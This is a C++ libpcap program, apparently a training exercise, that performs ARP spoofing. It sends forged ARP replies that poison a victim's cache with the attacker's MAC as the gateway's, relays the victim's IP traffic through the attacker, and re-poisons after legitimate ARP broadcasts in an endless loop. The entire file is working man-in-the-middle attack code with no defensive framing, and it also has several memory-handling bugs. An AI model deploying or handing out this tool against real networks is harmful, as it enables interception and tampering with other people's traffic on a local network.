#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <thread>


using namespace std;

#define PROMISCUOUS 1

struct ether_arp_hdr {

    unsigned char   	h_dest[6];	/* destination eth addr	*/
    unsigned char   	h_source[6];	/* source ether addr	*/
    unsigned short    h_proto;		/* packet type ID field	*/

    unsigned short int ar_hrd;		/* Format of hardware address.  */
    unsigned short int ar_pro;		/* Format of protocol address.  */
    unsigned char ar_hln;		/* Length of hardware address.  */
    unsigned char ar_pln;		/* Length of protocol address.  */
    unsigned short int ar_op;		/* ARP opcode (command).  */

    unsigned char __ar_sha[6];	/* Sender hardware address.  */
    unsigned char __ar_sip[4];		/* Sender IP address.  */
    unsigned char __ar_tha[6];	/* Target hardware address.  */
    unsigned char __ar_tip[4];		/* Target IP address.  */

};

struct ether_ip_hdr {

    unsigned char   	h_dest[6];	/* destination eth addr	*/
    unsigned char   	h_source[6];	/* source ether addr	*/
    unsigned short      h_proto;		/* packet type ID field	*/

    unsigned int ihl:4;
    unsigned int version:4;

    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;

};

struct ifreq ifr;

int get_my_mac(char *dev, char *packet) {

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        cout << "Socket error" << endl;
        return -1;
    }

    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        cout << "get_may_mac error" << endl;
        return -1;
    }

    memcpy(packet, ifr.ifr_ifru.ifru_hwaddr.sa_data, 6);

    return 0;
}

int change_ip(char ip[], char *packet) {

    sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(ip);
    memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

    return 0;

}

struct ether_arp_hdr *eth_arp_hdr;

int arp_packet(int op) {

    eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
    eth_arp_hdr->ar_hrd = htons(0x0001);
    eth_arp_hdr->ar_pro = htons(0x0800);
    eth_arp_hdr->ar_hln = 0x06;
    eth_arp_hdr->ar_pln = 0x04;
    eth_arp_hdr->ar_op = htons(op);

    return 0;

}

int send_request(pcap_t *pcd, char my_mac[6], char *gateway_ip, char *victim_ip) {

    memcpy(eth_arp_hdr->h_source, my_mac, 6);
    memset(eth_arp_hdr->h_dest, 0xff, 6);

    arp_packet(0x0001);

    memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
    memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 6);
    memset(eth_arp_hdr->__ar_tha, 0x00, 6);
    memcpy(eth_arp_hdr->__ar_tip, victim_ip, 6);

    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
        cout << "Error arp request ( For get victim mac )" << endl;
        return -1;
    }
    else cout << endl << "Send arp request for get victim mac" << endl;

    return 0;
}

struct pcap_pkthdr *pkthdr;
const u_char *packet;
int res;

int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *target_ip, char *sender_ip, char get_ip[4], char get_mac[6]) {

    // Victim <- Attacker
    // Attacker -> Gateway

    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
           if(res == 0) continue;
           if(res < 0) {
               cout << "Error reading the packets" << pcap_geterr(pcd);
               return -1;
           }

           eth_arp_hdr = (struct ether_arp_hdr*)packet;

           if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)  // Come reply packet
                   && memcmp(eth_arp_hdr->h_dest, my_mac, 6)==0
                   && memcmp(eth_arp_hdr->__ar_sip, sender_ip, 4)==0
                   && memcmp(eth_arp_hdr->__ar_tha, my_mac, 6)==0
                   && memcmp(eth_arp_hdr->__ar_tip, target_ip, 4)==0) {


               memcpy(get_mac, eth_arp_hdr->h_source, 6);
               change_ip((char*)eth_arp_hdr->__ar_sip, get_ip);

               cout << "Get ip and mac." << endl;
               break;
           }
       }

    return 0;
}

int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac[6], char *gateway_ip, char *victim_ip, int time) {

    // Attacker -> Victim
        memcpy(eth_arp_hdr->h_dest, victim_mac, 6);
        memcpy(eth_arp_hdr->h_source, my_mac, 6);

        arp_packet(0x0002);

        memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
        memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 4);
        memcpy(eth_arp_hdr->__ar_tha, victim_mac, 6);
        memcpy(eth_arp_hdr->__ar_tip, victim_ip, 4);

        if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
            cout << "Error send infaction packet" << endl;
            return -1;
        }
        else cout << endl << "Send infaction packet" << endl;

        if(time == 1) sleep(2);
        else ;

    return 0;
}

struct ethhdr *ep;

int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], char *gateway_mac, char *victim_ip, char *gateway_ip) {

    // Victim -> Attacker -> Gateway

        while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {

            if(res == 0) continue;
            if(res < 0) {
                cout << "Error reading the packets" << pcap_geterr(pcd);
                return -1;
            }

            ep = (struct ethhdr*)packet;

            if(ep->h_proto == htons(ETHERTYPE_IP)
                    && memcmp(ep->h_dest, my_mac, 6)==0
                    && memcmp(ep->h_source, victim_mac, 6)==0) {

                memcpy(ep->h_dest, gateway_mac, 6);
                memcpy(ep->h_source, victim_mac, 6);

                if(pcap_sendpacket(pcd, (const u_char*)packet, 1500) != 0) {
                    cout << "Error relay packet" << endl;
                    return -1;
                }
                else cout << "Send IP relay packet" << endl;
            }

            // Recovery
            if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)) {
               
                // Gateway's broadcast, Victim's broadcast
                if((memcmp(eth_arp_hdr->h_source, gateway_mac, 6)==0
                        && memcmp(eth_arp_hdr->__ar_sha, gateway_mac, 6)==0)
                        
                        || (memcmp(eth_arp_hdr->h_source, victim_mac, 6)==0
                            && memcmp(eth_arp_hdr->__ar_sha, victim_mac, 6)==0)) {

                    arp_infection_packet(dev, pcd, victim_mac, my_mac, gateway_ip, victim_ip, 2);
                }
                break;
            }

    }
    return 0;
}

int main(int argc, char *argv[]) {

    eth_arp_hdr = new ether_arp_hdr;
    char errbuf[PCAP_ERRBUF_SIZE];

    char *dev = argv[1];
    cout << endl << "Device : " << dev << endl << endl;

    char my_mac[6];
    get_my_mac(dev, my_mac);

    char *gateway_ip = argv[2];
    change_ip(gateway_ip, gateway_ip);

    char *victim_ip = argv[3];
    change_ip(victim_ip, victim_ip);

    // get
    char get_victim_mac[6];
    char get_gateway_mac[6];
    char get_gateway_ip[4];

    pcap_t *pcd;
    if((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }


    send_request(pcd, my_mac, gateway_ip, victim_ip);
    get_mac_and_ip(pcd, dev, my_mac, gateway_ip, victim_ip, get_gateway_ip, get_victim_mac); // Get victim mac

    cout << "*** Get victim mac" << endl;
    sleep(1);

    send_request(pcd, my_mac, victim_ip, gateway_ip);
    get_mac_and_ip(pcd, dev, my_mac, victim_ip, gateway_ip, get_gateway_ip, get_gateway_mac); // Get gateway mac
    sleep(1);
    cout << "*** Get gateway mac" << endl << endl << "*** *** *** Start" << endl;

    while(1) {
    thread t1(arp_infection_packet, dev, pcd, get_victim_mac, my_mac, gateway_ip, victim_ip, 1);
    thread t2(ip_relay_packet, pcd, dev, my_mac, get_victim_mac, get_gateway_mac, victim_ip, gateway_ip);
    t1.join();
    t2.join();
    }
}
